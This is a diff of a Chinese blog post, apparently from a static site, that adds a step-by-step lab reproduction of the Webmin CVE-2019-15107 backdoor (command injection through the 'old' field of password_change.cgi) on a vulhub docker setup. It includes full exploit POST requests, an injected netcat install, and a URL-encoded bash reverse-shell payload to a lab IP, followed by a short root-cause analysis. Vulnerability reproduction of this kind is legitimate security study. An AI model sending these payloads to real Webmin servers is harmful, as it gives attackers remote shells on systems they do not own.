@@ -74,7 +74,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">63</span>
+            <span class="post-count">1.2k</span>
         </span>
     </span>
 
@@ -83,7 +83,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1 分钟</span>
+            <span class="post-count">5 分钟</span>
         </span>
     </span>
 </div>
@@ -100,11 +100,86 @@
        
   <p><strong>漏洞编号</strong>：CVE-2019-15107</p>
 <p><strong>Webmin</strong>：基于Web的Unix系统管理工具。</p>
-<h5 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h5><p>Webmin&lt;=1.920</p>
-<h5 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h5><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><h5 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h5><h5 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h5><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><ul>
-<li><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-98060">https://www.seebug.org/vuldb/ssvid-98060</a></li>
-<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1553936">https://cloud.tencent.com/developer/article/1553936</a></li>
+<p><strong>SourceForge</strong>：全球最大的开放源代码软件开发平台和仓库。SourceForge上<code>&gt;=1.880</code>且<code>&lt;=1.920</code>版本的Webmin存在后门。</p>
+<p><strong>cgi</strong>：<code>公共网关接口脚本</code>类型文件，可理解为一个可执行的脚本，可以使用Python、Perl、Ruby等语言创建。用户向服务器发出请求，服务器接收用户请求并交给CGI程序处理，服务器把结果返回给用户。</p>
+<p><strong>qx</strong>：Perl的语法。执行外部程序，相当于<code>&quot;</code>。</p>
+<h5 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h5><p><code>password_change.cgi</code>文件在重置密码功能中存在一个代码执行漏洞，允许恶意第三方在缺少输入验证的情况下执行恶意代码。该漏洞实则是<code>SourceForge</code>上某些版本的安装包和源码被植入后门导致的。</p>
+<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>本文使用docker+vulhub搭建，docker和vulhub安装可以参考文末链接。</p>
+<p>安装完成后，切换到指定目录：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub/</span><br><span class="line">cd webmin</span><br><span class="line">cd CVE-<span class="number">2019</span>-<span class="number">15107</span>/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/06/8aOv1CSrTkFAGXD.png" alt="image-20210506151930630"></p>
+<p>启动环境：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/06/cdJ5Ov1f3bxu7hV.png" alt="image-20210506204039028"></p>
+<p>访问：<code>https://ip:10000/</code></p>
+<p>如果出现以下报错，手动输入<code>https</code>，提示不安全链接时继续前往。</p>
+<p><img src="https://i.loli.net/2021/05/06/QmWA2oensyUfLbw.png" alt="image-20210506205704676"></p>
+<p><img src="https://i.loli.net/2021/05/07/HjxPkUoWQ9fOheq.png" alt="image-20210506221448196"></p>
+<p>环境安装成功。</p>
+<h5 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h5><p>进入docker环境：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="built_in">exec</span> -it cve-<span class="number">2019</span>-15107_web_1 /<span class="built_in">bin</span>/bash</span><br></pre></td></tr></table></figure>
+
+<p>修改webmin默认root账户的密码（vulhub上的镜像有修改密码功能）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/webmin</span><br><span class="line">passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/06/MmJh8KPalnvAES2.png" alt="image-20210506221256712"></p>
+<p>登陆，开启密码重置功能，将允许用户使用旧密码设置新密码的选项勾选并保存（其他文章里说改完要重启webmin，我这里默认已经是勾选的，就没测试重启）。</p>
+<p><img src="https://i.loli.net/2021/05/06/8PxzBhbogXku12d.png" alt="image-20210506221845320"></p>
+<p>依旧是docker环境中的<code>/etc/webmin</code>目录下，查看配置文件，确定<code>passwd_mode</code>的值为<code>2</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat miniserv.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/06/pE2f1ds3BHnQJA4.png" alt="image-20210506222153063"></p>
+<p>为了方便测试，关闭SSL功能：<img src="https://i.loli.net/2021/05/07/oCdvmPTwgaVzR7k.png" alt="image-20210507083518058"></p>
+<p>关闭以后使用<code>http://ip:10000</code>访问，如果登陆报错清一下cookie重新试试。</p>
+<p>创建一个新的webmin用户：</p>
+<p><img src="https://i.loli.net/2021/05/07/6osmCKFONtEhb7r.png" alt="image-20210507085754173"></p>
+<p>勾选<code>Force change at next login </code>：</p>
+<p><img src="https://i.loli.net/2021/05/07/8PGc4Kad6hqH39u.png" alt="image-20210507092522456"></p>
+<p>退出登录，使用刚刚创建的账号登录，可以发现跳转到了使用旧密码更改新密码的界面。</p>
+<p><img src="https://i.loli.net/2021/05/07/aeYKDu2yTXGkxB7.png" alt="image-20210507092738627"></p>
+<p>抓包：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /password_change.cgi HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.242</span><span class="number">.129</span>:<span class="number">10000</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">88.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">88.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">42</span></span><br><span class="line">Origin: http://<span class="number">192.168</span><span class="number">.242</span><span class="number">.129</span>:<span class="number">10000</span></span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.242</span><span class="number">.129</span>:<span class="number">10000</span>/session_login.cgi</span><br><span class="line">Cookie: redirect=<span class="number">1</span>; testing=<span class="number">1</span>; sid=x</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">user=test&amp;pam=<span class="number">1</span>&amp;expired=<span class="number">2</span>&amp;old=&amp;new1=&amp;new2=</span><br></pre></td></tr></table></figure>
+
+<p>新密码随便填，不填命令无法执行。旧密码可以不填，也无需用<code>|</code>将密码和命令分开，可以直接执行。</p>
+<p>了解了漏洞点包的构造后，经过多次尝试确认，如果不知道用户密码，也可以直接在登陆页面抓包，将文件路径修改为<code>/password_change.cgi</code>，在正文中填入以下语句（用户名和新密码都可以随便填）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=test&amp;pam=<span class="number">1</span>&amp;expired=<span class="number">2</span>&amp;old=&amp;new1=<span class="number">1</span>&amp;new2=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/07/xvqEOzHbU6kTScC.png" alt="image-20210507103119198"></p>
+<p>成功执行<code>ls</code>命令，漏洞存在。</p>
+<blockquote>
+<p>不知道为什么重新开虚拟机之后环境就重置了，修改操作都要重新来一遍。</p>
+</blockquote>
+<h5 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h5><p>Linux nc反弹shell命令（不编码无法执行）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.242.128/7777 0&gt;&amp;1&quot;</span></span><br><span class="line">  </span><br><span class="line">url编码结果：</span><br><span class="line">bash -c %22bash -i %3E%<span class="number">26</span> %2Fdev%2Ftcp%2F192<span class="number">.168</span><span class="number">.242</span><span class="number">.128</span>%2F7777 <span class="number">0</span>%3E%<span class="number">261</span>%<span class="number">22</span></span><br></pre></td></tr></table></figure>
+
+<p>docker环境里没有netcat，先安装netcat：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=test&amp;pam=<span class="number">1</span>&amp;expired=<span class="number">2</span>&amp;old=apt install netcat -y&amp;new1=<span class="number">1</span>&amp;new2=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>POC</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /password_change.cgi HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.242</span><span class="number">.129</span>:<span class="number">10000</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">88.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">88.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">119</span></span><br><span class="line">Origin: http://<span class="number">192.168</span><span class="number">.242</span><span class="number">.129</span>:<span class="number">10000</span></span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.242</span><span class="number">.129</span>:<span class="number">10000</span>/session_login.cgi</span><br><span class="line">Cookie: redirect=<span class="number">1</span>; testing=<span class="number">1</span>; sid=x</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">user=test&amp;pam=<span class="number">1</span>&amp;expired=<span class="number">2</span>&amp;old=bash -c %22bash -i %3E%<span class="number">26</span> %2Fdev%2Ftcp%2F192<span class="number">.168</span><span class="number">.242</span><span class="number">.128</span>%2F7777 <span class="number">0</span>%3E%<span class="number">261</span>%<span class="number">22</span>&amp;new1=<span class="number">1</span>&amp;new2=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/07/r53vgBPSaNL9cZm.png" alt="image-20210507113059097"></p>
+<p>成功getshell。</p>
+<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>查看<code>password_change.cgi</code>文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ..</span><br><span class="line">ls //可以发现在/usr/share/webmin目录下有password_change.cgi文件。</span><br><span class="line">cat password_change.cgi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/07/ZLexRIfop2Q8wkG.png" alt="image-20210507124715407"></p>
+<p><code>$in&#123;&#39;old&#39;&#125;</code>参数被<code>qx/ /</code>包裹，于是<code>old</code>参数的值将会被执行，而<code>old</code>可以从外部传参，就造成了命令执行漏洞。</p>
+<p>详细分析看这个：<a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/106978162">https://blog.csdn.net/whatday/article/details/106978162</a></p>
+<p>关闭镜像：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><ul>
 <li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1019/">https://paper.seebug.org/1019/</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/106978162">https://blog.csdn.net/whatday/article/details/106978162</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/10/24/5db1ac1aedbb9/%EF%BC%88%E6%89%BE%E6%BC%8F%E6%B4%9E%E7%82%B9%EF%BC%89">https://www.dazhuanlan.com/2019/10/24/5db1ac1aedbb9/（找漏洞点）</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/EC_Carrot/article/details/114300857%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AE%89%E8%A3%85nc%E5%92%8Cgetshell%EF%BC%89">https://blog.csdn.net/EC_Carrot/article/details/114300857（命令执行安装nc和getshell）</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6db98793d043%EF%BC%88getshell%EF%BC%89">https://www.jianshu.com/p/6db98793d043（getshell）</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/charon1937/p/13757124.html%EF%BC%88%E5%AE%89%E8%A3%85docker%E5%92%8Cvulhub%EF%BC%89">https://www.cnblogs.com/charon1937/p/13757124.html（安装docker和vulhub）</a></li>
 </ul>
  
       <!-- reward -->
